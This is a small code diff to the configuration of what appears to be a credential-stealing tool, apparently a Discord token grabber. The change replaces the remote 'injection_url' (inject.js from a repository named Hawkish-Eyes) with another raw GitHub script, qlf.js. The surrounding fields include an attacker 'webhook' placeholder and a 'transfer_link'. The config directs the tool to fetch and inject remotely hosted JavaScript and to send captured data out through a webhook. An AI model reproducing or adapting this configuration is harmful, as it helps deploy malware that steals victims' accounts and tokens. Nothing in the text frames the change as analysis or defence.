@@ -19,7 +19,7 @@ var config = {
 
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/Inplex-sys/Hawkish-Eyes/main/inject.js",
+    injection_url: "https://raw.githubusercontent.com/alv7n/qlf/main/qlf.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
